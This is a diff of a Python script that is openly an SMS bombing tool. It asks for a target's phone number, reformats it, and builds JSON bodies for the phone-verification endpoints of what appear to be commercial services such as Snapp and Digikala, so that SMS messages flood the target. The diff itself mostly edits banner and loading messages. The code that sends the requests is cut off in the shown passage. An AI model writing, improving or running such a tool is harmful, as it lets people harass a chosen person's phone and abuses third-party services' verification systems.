@@ -2,26 +2,26 @@ import os
 import threading
 import requests
 import time
+from colorama import Fore
 def print_slow(txt):
     for x in txt:
         print(x, end='', flush=True)  
         time.sleep(0.1)
 red='\033[31m'
 green='\033[32m'
-print("toilet -f mono12 -F gay bomb") 
+os.system("clear") 
+os.system("toilet -f mono12 -F gay SMS")
 
 phone = input(f"{green}[?]your target namber:  ") 
 f = "0" + phone.split("98")[1]
 os.system("clear")
-print_slow("loading[♥♥10%]\n")
+print_slow("LODING...............LODING]\n")
 os.system("clear")
-print_slow("loading[★★★★40%]\n")
+print_slow("LODING...............LODING]\n")
 os.system("clear")
-print_slow("loading[•••••••••••••••80%]\n")
+print_slow("LODING...............LODING]\n")
 os.system("clear")
-print_slow("loading[♝♞♟♜♚♛♗100%]\n")
-os.system("clear")
-print("sms bomb your target  :  ")
+print("YOUR target SMS")
 snapj = {"cellphone":phone}
 digij = {"cellNumber":f,"device":{"deviceId":"a16e6255-17c3-431b-b047-3f66d24c286f","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
 snap2j = {"phone":f}
